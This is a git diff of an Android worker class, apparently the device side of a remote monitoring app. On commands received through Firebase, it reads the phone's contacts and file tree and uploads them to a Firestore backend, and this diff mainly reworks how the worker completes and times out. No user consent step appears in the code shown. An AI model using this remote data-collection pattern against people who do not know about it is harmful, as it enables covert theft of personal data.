@@ -6,17 +6,22 @@ import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.net.Uri;
+import android.os.Handler;
 import android.provider.ContactsContract;
 import android.util.Base64;
 import android.util.Log;
 import android.webkit.MimeTypeMap;
 
 import androidx.annotation.NonNull;
+import androidx.concurrent.futures.CallbackToFutureAdapter;
+import androidx.work.ListenableWorker;
 import androidx.work.Worker;
 import androidx.work.WorkerParameters;
 
+import com.google.common.util.concurrent.ListenableFuture;
 import com.google.firebase.firestore.DocumentChange;
 import com.google.firebase.firestore.FirebaseFirestore;
+import com.google.firebase.firestore.ListenerRegistration;
 import com.lyrnic.userside.constants.Actions;
 import com.lyrnic.userside.constants.Constants;
 import com.lyrnic.userside.firebase.FirebaseActionsReceiver;
@@ -33,9 +38,13 @@ import java.util.ArrayList;
 import java.util.HashSet;
 
 
-public class ActionsWorker extends Worker {
+public class ActionsWorker extends ListenableWorker  {
     ArrayList<Contact> contactList = new ArrayList<>();
-
+    long lastUpdate = 0;
+    boolean returnResult;
+    ListenerRegistration listener;
+    MyCallback callback;
+    boolean success;
     private static final String[] PROJECTION = new String[]{
             ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
             ContactsContract.Contacts.DISPLAY_NAME,
@@ -44,6 +53,88 @@ public class ActionsWorker extends Worker {
     boolean listening;
     public ActionsWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
         super(context, workerParams);
+    }
+
+    @NonNull
+    @Override
+    public ListenableFuture<Result> startWork() {
+        return CallbackToFutureAdapter.getFuture(completer -> {
+            callback = new MyCallback() {
+                @Override
+                public void onSuccess() {
+                    completer.set(Result.success());
+                }
+
+                @Override
+                public void onError() {
+                    completer.set(Result.retry());
+                }
+            };
+
+            start();
+            return callback;
+        });
+    }
+    public void start(){
+        String action = getInputData().getString(Constants.DATA_ACTION_KEY);
+
+        if (action == null) {
+            callback.onError();
+        }
+        String token = getInputData().getString(Constants.DEVICE_TOKEN_KEY);
+        switch (action) {
+            case Actions.ACTION_GET_CONTACTS:
+                try {
+                    getContacts();
+                    lastUpdate = System.currentTimeMillis();
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                    returnResult = true;
+                }
+                break;
+            case Actions.ACTION_GET_FILE_TREE:
+                String exists = getInputData().getString(Constants.DATA_PATH_EXISTS_KEY);
+                String path = getInputData().getString(Constants.DATA_PATH_KEY);
+
+                ApiClient.pushAction(getApplicationContext(), Actions.ACTION_GET_FILE_TREE, token, exists);
+
+                try {
+                    getFileTree(path);
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                    returnResult = true;
+                }
+                break;
+            case Actions.ACTION_GET_STATE:
+                ApiClient.pushAction(getApplicationContext(), Actions.ACTION_GET_STATE,getInputData().getString(Constants.DATA_DEVICE_TOKEN_KEY));
+                callback.onSuccess();
+                return;
+        }
+
+        Handler handler = new Handler();
+
+        handler.post(new Runnable() {
+            @Override
+            public void run() {
+                if(System.currentTimeMillis() - lastUpdate > 60000){
+                    returnResult = true;
+
+                    if(listener != null){
+                        listener.remove();
+
+                    }
+                    if (success) {
+                        callback.onSuccess();
+                    } else {
+                        callback.onError();
+                    }
+                }
+                if(!returnResult){
+                    handler.postDelayed(this,1000);
+                }
+            }
+        });
+
     }
 
 
@@ -109,12 +200,15 @@ public class ActionsWorker extends Worker {
             return;
         }
 
-        db.collection(Constants.DEVICES_COLLECTION_NAME)
+        listener = db.collection(Constants.DEVICES_COLLECTION_NAME)
                 .whereEqualTo(Constants.DEVICE_TOKEN_KEY, FirebaseActionsReceiver.getToken(getApplicationContext()))
                 .addSnapshotListener(((value, error) -> {
                     if (value == null || error != null) {
+                        success = false;
                         return;
                     }
+                    lastUpdate = System.currentTimeMillis();
+                    success = true;
 
                     for (DocumentChange dc : value.getDocumentChanges()) {
                         if (dc.getType().equals(DocumentChange.Type.MODIFIED)) {
@@ -202,43 +296,7 @@ public class ActionsWorker extends Worker {
         return mimeType;
     }
 
-    @NonNull
-    @Override
-    public Result doWork() {
-        String action = getInputData().getString(Constants.DATA_ACTION_KEY);
 
-        if (action == null) {
-            return Result.failure();
-        }
-        String token = getInputData().getString(Constants.DEVICE_TOKEN_KEY);
-        switch (action) {
-            case Actions.ACTION_GET_CONTACTS:
-                try {
-                    getContacts();
-                    return Result.success();
-                } catch (JSONException e) {
-                    e.printStackTrace();
-                }
-                break;
-            case Actions.ACTION_GET_FILE_TREE:
-                String exists = getInputData().getString(Constants.DATA_PATH_EXISTS_KEY);
-                String path = getInputData().getString(Constants.DATA_PATH_KEY);
-
-                ApiClient.pushAction(getApplicationContext(), Actions.ACTION_GET_FILE_TREE, token, exists);
-
-                try {
-                    getFileTree(path);
-                    return Result.success();
-                } catch (JSONException e) {
-                    e.printStackTrace();
-                }
-                break;
-            case Actions.ACTION_GET_STATE:
-                ApiClient.pushAction(getApplicationContext(), Actions.ACTION_GET_STATE,getInputData().getString(Constants.DATA_DEVICE_TOKEN_KEY));
-                break;
-        }
-        return Result.failure();
-    }
     public void updateDeviceWithContactsList(String contactsJSON) {
         FirebaseFirestore db = FirebaseFirestore.getInstance();
 
@@ -246,8 +304,10 @@ public class ActionsWorker extends Worker {
                 .document(DevicesUtilities.getDeviceDocumentId(getApplicationContext()))
                 .update(Constants.DEVICE_CONTACTS_KEY, contactsJSON).addOnCompleteListener((task -> {
                     if (task.isSuccessful()) {
+                        success = true;
                         ApiClient.pushAction(getApplicationContext(), Actions.ACTION_GET_CONTACTS,getInputData().getString(Constants.DEVICE_TOKEN_KEY));
-                       Log.d("FCM","contacts uploaded successfully");
+                        Log.d("FCM","contacts uploaded successfully");
+                        returnResult = true;
                     }
                 }));
     }
@@ -274,7 +334,7 @@ public class ActionsWorker extends Worker {
                     if (!mobileNoSet.contains(number)) {
                         contactList.add(new Contact(name, number));
                         mobileNoSet.add(number);
-                        Log.d("hvy", "onCreaterrView  Phone Number: name = " + name
+                        Log.d("hvy", "onCreate View  Phone Number: name = " + name
                                 + " No = " + number);
                     }
                 }
@@ -282,5 +342,9 @@ public class ActionsWorker extends Worker {
                 cursor.close();
             }
         }
+    }
+    interface MyCallback {
+        void onSuccess();
+        void onError();
     }
 }
